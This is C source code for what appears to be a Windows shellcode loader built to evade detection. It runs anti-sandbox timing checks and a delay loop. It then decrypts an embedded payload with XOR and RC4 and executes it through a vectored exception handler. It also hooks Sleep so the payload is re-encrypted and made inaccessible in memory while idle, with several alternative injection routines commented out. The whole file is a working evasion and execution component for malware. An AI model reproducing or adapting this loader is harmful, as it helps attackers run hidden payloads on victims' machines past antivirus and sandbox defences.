#include<stdio.h>
#include<Windows.h>
#include"CodeInject.h"
#include"AntiSandbox.h"
#include"Loader.h"
#include"shellcode.h"
#include"MyHook.h"
#include"xorstr.hpp"
#include"Crypto.h"


CInlineHook MyHookObj;

VOID WINAPI DetourSleep(_In_ DWORD dwMilliseconds)
{
	DWORD OldProtect = 0;

    MyHookObj.UnHook64();

	Crypto::XORrecoder(shellcode, len_shellcode, xor_key);
	Crypto::rc4_crypt(shellcode, len_shellcode, rc4_key, rc4_key_len);

	VirtualProtect(shellcode, 0x1000, PAGE_NOACCESS, &OldProtect);
	Sleep(dwMilliseconds);
	VirtualProtect(shellcode, 0x1000, PAGE_EXECUTE_READWRITE, &OldProtect);

	Crypto::rc4_crypt(shellcode, len_shellcode, rc4_key, rc4_key_len);
	Crypto::XORrecoder(shellcode, len_shellcode, xor_key);

    MyHookObj.ReHook64();
}

void __forceinline delay()
{
	for (int i = 0; i < 0xFFFFFF*5; ++i)
		Sleep(0);
}

int main()
{

#ifdef ENCODE
	Crypto::XORrecoder(shellcode, len_shellcode, xor_key);
	Crypto::rc4_crypt(shellcode, len_shellcode, rc4_key, rc4_key_len);
	for (size_t i = 0; i < len_shellcode; i++)
		printf("0x%02x,", shellcode[i]);

#else
	//CHAR MyName[MAX_PATH] = "nvcontainer.exe";
	//AntiSandbox::AntiSandboxByName(MyName);
	AntiSandbox::AntiSandboxByRuntime();
	//AntiSandbox::AntiSandboxByRuntimeEx();

	delay();
	
	MyHookObj.Hook64(xorstr_("KERNEL32.DLL"), xorstr_("Sleep"), (PROC)DetourSleep);

	Crypto::rc4_crypt(shellcode, len_shellcode, rc4_key, rc4_key_len);
	Crypto::XORrecoder(shellcode, len_shellcode, xor_key);

	//Loader::RunShellCode_1(shellcode);
	//Loader::RunShellCode_2(shellcode);
	//Loader::InjectShellCode_1(shellcode);
	//Loader::CertEnumSystemStoreCallbackRunShellcode(shellcode);
	Loader::VehRunShellcode(shellcode);

#endif

	return 0;
}